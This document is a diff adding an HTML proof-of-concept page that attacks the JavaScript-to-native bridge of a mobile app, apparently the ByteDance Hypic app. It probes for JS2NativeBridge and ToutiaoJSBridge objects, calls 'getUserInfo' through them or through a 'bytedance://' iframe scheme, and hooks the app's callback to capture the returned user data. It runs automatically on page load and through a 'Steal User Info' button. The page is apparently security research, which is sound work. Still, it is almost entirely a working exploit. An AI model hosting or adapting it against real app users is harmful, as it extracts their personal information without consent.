@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hypic JSB PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+    <h1>Hypic JS2NativeBridge PoC</h1>
+    <p>Attempting to call JSB</p>
+    <button onclick="stealInfo()">Steal User Info</button>
+    <pre id="output"></pre>
+
+    <script>
+        function log(msg) {
+            document.getElementById('output').innerText += msg + "\n";
+        }
+
+        function stealInfo() {
+            log("Attempting to call JSB...");
+            try {
+                var payload = {
+                    __msg_type: "call",
+                    func: "getUserInfo",
+                    params: {},
+                    JSSDK: "1",
+                    __callback_id: "1"
+                };
+
+                var payloadStr = JSON.stringify(payload);
+
+                if (window.JS2NativeBridge) {
+                    log("JS2NativeBridge found!");
+                    if (window.JS2NativeBridge._invokeMethod) {
+                        window.JS2NativeBridge._invokeMethod(payloadStr);
+                        log("Called _invokeMethod(payload)");
+                    } else if (window.JS2NativeBridge.call) {
+                        window.JS2NativeBridge.call("getUserInfo", payloadStr);
+                        log("Called call('getUserInfo', payload)");
+                    }
+                } else if (window.ToutiaoJSBridge && window.ToutiaoJSBridge.invokeMethod) {
+                    log("ToutiaoJSBridge found!");
+                    window.ToutiaoJSBridge.invokeMethod(payloadStr);
+                } else if (window.androidJsBridge) {
+                    log("androidJsBridge found!");
+                } else if (window.iesJsBridgeTransferMonitor) {
+                    log("iesJsBridgeTransferMonitor found!");
+                } else {
+                    log("JS Bridge not found on window object. Dumping window properties:");
+                    var keys = Object.keys(window);
+                    for (var i = 0; i < keys.length; i++) {
+                        if (keys[i].toLowerCase().indexOf("bridge") !== -1 || keys[i].toLowerCase().indexOf("toutiao") !== -1 || keys[i].toLowerCase().indexOf("bytedance") !== -1) {
+                            log("Found suspicious window property: " + keys[i]);
+                        }
+                    }
+
+                    log("Attempting iframe scheme fallback...");
+                    var iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = 'bytedance://dispatch_message/';
+                    document.body.appendChild(iframe);
+                    setTimeout(function() {
+                        iframe.remove();
+                    }, 500);
+                }
+            } catch (e) {
+                log("Error: " + e.message);
+            }
+        }
+
+        // Setup the callback receiver that the app expects
+        if (!window.ToutiaoJSBridge) {
+            window.ToutiaoJSBridge = {};
+        }
+
+        window.ToutiaoJSBridge._handleMessageFromToutiao = function(message) {
+            log("Received message from app:\n" + JSON.stringify(message, null, 2) + "\n\n");
+        };
+
+        // Try to run automatically
+        setTimeout(stealInfo, 1000);
+    </script>
+</body>
+</html>
